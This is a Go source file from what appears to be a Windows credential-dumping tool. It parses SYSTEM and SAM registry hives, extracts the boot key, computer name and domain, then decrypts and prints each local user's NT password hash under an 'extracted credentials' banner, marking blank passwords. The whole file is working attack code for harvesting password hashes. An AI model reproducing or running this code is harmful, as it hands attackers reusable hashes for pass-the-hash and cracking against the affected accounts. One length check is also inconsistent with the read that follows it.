package main

import (
	"encoding/binary"
	"fmt"
	"strings"
)

func parseSAM(data []byte, bootKey []byte) {
	hive, err := parseHive(data)
	if err != nil {
		fmt.Printf("[+] failed to parse sam hive\n")
		return
	}
	
	_, err = hive.ReadNKRecord(hive.RootCellIndex)
	if err != nil {
		fmt.Printf("[+] failed to read root key\n")
		return
	}
	
	usersKey, err := hive.FindKey("SAM\\Domains\\Account\\Users")
	if err != nil {
		fmt.Printf("[+] failed to find users key\n")
		return
	}
	
	fmt.Println("\n╔════════════════════════════════════════════════════════════╗")
	fmt.Println("║                     extracted credentials                  ║")
	fmt.Println("╚════════════════════════════════════════════════════════════╝")
	
	subkeys := hive.GetSubkeys(usersKey)
	
	userMap := make(map[uint32]string)
	
	for _, subkey := range subkeys {
		if strings.EqualFold(subkey.Name, "Names") {
			namesKeys := hive.GetSubkeys(subkey)
			for _, nameKey := range namesKeys {
				username := nameKey.Name
				values := hive.GetValues(nameKey)
				
				var rid uint32
				found := false
				
				for _, vk := range values {
					if len(vk.Data) >= 4 {
						if vk.DataType == 4 || vk.DataType == 0 {
							rid = binary.LittleEndian.Uint32(vk.Data[:4])
							found = true
							break
						}
					}
				}
				
				if !found && len(values) > 0 {
					for _, vk := range values {
						if (vk.Name == "(Default)" || vk.Name == "") && len(vk.Data) >= 4 {
							rid = binary.LittleEndian.Uint32(vk.Data[:4])
							found = true
							break
						}
					}
				}
				
				if found && rid > 0 {
					userMap[rid] = username
				}
			}
		}
	}
	
	for _, subkey := range subkeys {
		if subkey.Name == "Names" {
			continue
		}
		
		ridHex := subkey.Name
		if len(ridHex) == 8 {
			var rid uint32
			fmt.Sscanf(ridHex, "%x", &rid)
			
			username := userMap[rid]
			
			values := hive.GetValues(subkey)
			
			if username == "" {
				for _, vk := range values {
					if vk.Name == "V" && len(vk.Data) >= 0x30 {
						nameOffset := binary.LittleEndian.Uint32(vk.Data[0x0C:0x10]) + 0xCC
						nameLen := binary.LittleEndian.Uint32(vk.Data[0x10:0x14])
						
						if nameLen > 0 && int(nameOffset+nameLen) <= len(vk.Data) {
							nameBytes := vk.Data[nameOffset : nameOffset+nameLen]
							username = utf16ToString(nameBytes)
						}
						break
					}
				}
			}
			
			if username == "" {
				username = "unknown"
			}
			
			fmt.Printf("\n[+] user: %s\n", username)
			fmt.Printf("    rid: %d (0x%08x)\n", rid, rid)
			
			for _, vk := range values {
				if vk.Name == "F" && len(vk.Data) >= 0x38 {
					flags := binary.LittleEndian.Uint32(vk.Data[0x38:0x3C])
					
					status := ""
					if flags&0x0001 != 0 {
						status = "disabled"
					} else {
						status = "enabled"
					}
					if flags&0x0010 != 0 {
						status += " | locked"
					}
					
					fmt.Printf("    status: %s\n", status)
				}
				
				if vk.Name == "V" {
					if len(vk.Data) >= 0xCC {
						ntHashOffset := binary.LittleEndian.Uint32(vk.Data[0xA8:0xAC]) + 0xCC
						ntHashLen := binary.LittleEndian.Uint32(vk.Data[0xAC:0xB0])
						
						if ntHashLen > 0 && int(ntHashOffset+ntHashLen) <= len(vk.Data) {
							encryptedHash := vk.Data[ntHashOffset : ntHashOffset+ntHashLen]
							
							if bootKey != nil {
								decryptedHash := decryptHashWithBootKey(encryptedHash, bootKey, rid)
								
								if decryptedHash != nil && len(decryptedHash) >= 16 {
									fmt.Printf("    nt hash: ")
									for i := 0; i < 16 && i < len(decryptedHash); i++ {
										fmt.Printf("%02x", decryptedHash[i])
									}
									fmt.Printf("\n\n")
									
									emptyPasswordHash := "31d6cfe0d16ae931b73c59d7e0c089c0"
									actualHash := ""
									for i := 0; i < 16 && i < len(decryptedHash); i++ {
										actualHash += fmt.Sprintf("%02x", decryptedHash[i])
									}
									
									allZeros := true
									for i := 0; i < 16 && i < len(decryptedHash); i++ {
										if decryptedHash[i] != 0 {
											allZeros = false
											break
										}
									}
									
									if actualHash == emptyPasswordHash {
										fmt.Printf("    note: blank password\n")
									} else if allZeros {
										fmt.Printf("    note: no password set\n")
									}
								} else {
									fmt.Printf("    nt hash: [decryption failed]\n")
								}
							} else {
								fmt.Printf("    nt hash: [encrypted - bootkey required]\n")
							}
						}
					}
				}
			}
		}
	}
}

func parseSYSTEM(data []byte) ([]byte, string, bool) {
	hive, err := parseHive(data)
	if err != nil {
		return nil, "", false
	}
	
	_, err = hive.ReadNKRecord(hive.RootCellIndex)
	if err != nil {
		return nil, "", false
	}
	
	bootKey := extractBootKey(hive)
	domainName := "WORKGROUP"
	isDomainJoined := false
	
	if bootKey != nil {
		fmt.Printf("[+] bootkey: ")
		for _, b := range bootKey {
			fmt.Printf("%02x", b)
		}
		fmt.Println()
		
		computerNameKey, err := hive.FindKey("ControlSet001\\Control\\ComputerName\\ComputerName")
		if err == nil {
			values := hive.GetValues(computerNameKey)
			for _, vk := range values {
				if strings.EqualFold(vk.Name, "ComputerName") && vk.DataType == 1 {
					computerName := utf16ToString(vk.Data)
					fmt.Printf("[+] computer: %s\n", computerName)
				}
			}
		}
		
		// Extract domain information
		tcpipKey, err := hive.FindKey("ControlSet001\\Services\\Tcpip\\Parameters")
		if err == nil {
			values := hive.GetValues(tcpipKey)
			for _, vk := range values {
				if strings.EqualFold(vk.Name, "Domain") && vk.DataType == 1 {
					domain := utf16ToString(vk.Data)
					if domain != "" && domain != "WORKGROUP" {
						domainName = domain
						isDomainJoined = true
						fmt.Printf("[+] domain: %s (domain-joined)\n", domain)
					} else {
						domainName = domain
						fmt.Printf("[+] domain: %s (workgroup)\n", domain)
					}
					break
				}
			}
		} else {
			// Fallback: check if we can find domain info elsewhere
			fmt.Printf("[+] domain: WORKGROUP (not domain-joined)\n")
		}
	}
	
	return bootKey, domainName, isDomainJoined
}

